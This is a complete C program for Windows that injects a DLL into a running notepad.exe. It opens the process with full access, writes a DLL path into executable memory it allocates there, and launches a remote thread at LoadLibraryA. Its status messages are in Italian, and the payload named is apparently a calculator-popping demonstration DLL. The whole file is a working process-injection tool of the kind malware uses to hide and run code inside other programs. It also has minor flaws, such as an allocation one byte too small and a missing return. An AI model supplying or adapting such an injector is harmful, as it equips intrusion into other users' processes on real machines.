#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>


static const int PATH_BUFFER_SIZE = 256;

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    //system("c:\\windows\\syswow64\\notepad.exe");
	//SleepEx(1,0);
	

    char dllLibFullPath[PATH_BUFFER_SIZE];

    LPCSTR processName = "notepad.exe";
    LPCSTR dllLibName = "PopCalc.dll";

    DWORD processId = getProcessId(processName);
    if (!processId) {
        printf("[x] Non riesco a trovare il processo  %s\n", processName);
        exit(1);
    }
    printf("[*] Processo trovato %s(PID = %d)\n", processName, processId);

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        printf("[x] Non trovo la DLL %s\n", dllLibName);
        exit(1);
    }
    printf("[*] DLL  %s trovata\n", dllLibFullPath);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
    if (hProcess == NULL) {
        printf("[x] Non riesco a trovare il processo con ID %d\n", processId);
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT,
                                               PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        printf("[x] VirtuallAllocEx fallita\n");
        exit(1);
    }
    printf("[*] Allocati %d bytes nella regione  %#08x \n", strlen(dllLibFullPath), dllAllocatedMemory);

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        printf("[x] WriteProcessMemoryFallita\n");
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    printf("[*] Thread remoto su processo  %s(PID = %d) partito\n", processName, processId);
    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary,
                                                    dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        printf("[-] Non riesco a far partire il thread remoto sul processo id %d\n", processId);
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}